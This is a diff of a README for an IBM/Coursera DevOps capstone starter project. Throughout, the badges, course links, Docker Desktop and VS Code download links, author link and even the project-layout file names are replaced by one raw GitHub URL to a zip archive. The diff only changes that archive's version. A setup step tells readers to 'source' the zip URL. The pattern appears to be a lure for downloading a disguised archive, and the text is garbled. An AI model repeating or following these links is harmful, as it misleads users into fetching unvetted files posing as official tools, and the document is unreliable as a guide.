@@ -1,9 +1,9 @@
 # DevOps Capstone Template
 
-[![License](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip%https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip)](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip)
-[![Python 3.9](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip)](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip)
+[![License](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip%https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip)](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip)
+[![Python 3.9](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip)](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip)
 
-This repository contains the starter code for the project in [**IBM-CD0285EN-SkillsNetwork DevOps Capstone Project**](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip) which is part of the [**IBM DevOps and Software Engineering Professional Certificate**](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip)
+This repository contains the starter code for the project in [**IBM-CD0285EN-SkillsNetwork DevOps Capstone Project**](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip) which is part of the [**IBM DevOps and Software Engineering Professional Certificate**](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip)
 
 ## Usage
 
@@ -15,10 +15,10 @@ Do Not fork this code! It is meant to be used by pressing the  <span style=color
 
 These labs are designed to be executed in the IBM Developer Skills Network Cloud IDE with OpenShift. Please use the links provided in the Coursera Capstone project to access the lab environment.
 
-Once you are in the lab environment, you can initialize it with `https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip` by sourcing it. (*Note: DO NOT run this program as a bash script. It sets environment variable and so must be sourced*):
+Once you are in the lab environment, you can initialize it with `https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip` by sourcing it. (*Note: DO NOT run this program as a bash script. It sets environment variable and so must be sourced*):
 
 ```bash
-source https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip
+source https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip
 ```
 
 This will install Python 3.9, make it the default, modify the bash prompt, create a Python virtual environment and activate it.
@@ -61,20 +61,20 @@ You can use the `docker ps` command to make sure that postgres is up and running
 
 ## Project layout
 
-The code for the microservice is contained in the `service` package. All of the test are in the `tests` folder. The code follows the **Model-View-Controller** pattern with all of the database code and business logic in the model (`https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip`), and all of the RESTful routing on the controller (`https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip`).
+The code for the microservice is contained in the `service` package. All of the test are in the `tests` folder. The code follows the **Model-View-Controller** pattern with all of the database code and business logic in the model (`https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip`), and all of the RESTful routing on the controller (`https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip`).
 
 ```text
 ├── service         <- microservice package
 │   ├── common/     <- common log and error handlers
-│   ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip   <- Flask configuration object
-│   ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip   <- code for the persistent model
-│   └── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip   <- code for the REST API routes
-├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip       <- tools setup config
+│   ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip   <- Flask configuration object
+│   ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip   <- code for the persistent model
+│   └── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip   <- code for the REST API routes
+├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip       <- tools setup config
 └── tests                       <- folder for all of the tests
-    ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip            <- test factories
-    ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip    <- CLI tests
-    ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip          <- model unit tests
-    └── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip          <- route unit tests
+    ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip            <- test factories
+    ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip    <- CLI tests
+    ├── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip          <- model unit tests
+    └── https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip          <- route unit tests
 ```
 
 ## Data Model
@@ -98,7 +98,7 @@ Complete this microservice by implementing REST API's for `READ`, `UPDATE`, `DEL
 
 This repo can also be used for local Kubernetes development. It is not advised that you run these commands in the Cloud IDE environment. The purpose of these commands are to simulate the Cloud IDE environment locally on your computer. 
 
-At a minimum, you will need [Docker Desktop](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip) installed on your computer. For the full development environment, you will also need [Visual Studio Code](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip) with the [Remote Containers](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip) extension from the Visual Studio Marketplace. All of these can be installed manually by clicking on the links above or you can use a package manager like **Homebrew** on Mac of **Chocolatey** on Windows.
+At a minimum, you will need [Docker Desktop](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip) installed on your computer. For the full development environment, you will also need [Visual Studio Code](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip) with the [Remote Containers](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip) extension from the Visual Studio Marketplace. All of these can be installed manually by clicking on the links above or you can use a package manager like **Homebrew** on Mac of **Chocolatey** on Windows.
 
 Please only use these commands for working stand-alone on your own computer with the VSCode Remote Container environment provided.
 
@@ -124,7 +124,7 @@ You can now perform Tekton development locally, just like in the Cloud IDE lab e
 
 ## Author
 
-[John Rofrano](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/project_capstone_devops_v1.0.zip), Senior Technical Staff Member, DevOps Champion, @ IBM Research, and Instructor @ Coursera
+[John Rofrano](https://raw.githubusercontent.com/ENAHSIN/devops-capstone-project/main/deploy/devops_project_capstone_v1.8.zip), Senior Technical Staff Member, DevOps Champion, @ IBM Research, and Instructor @ Coursera
 
 ## License
 
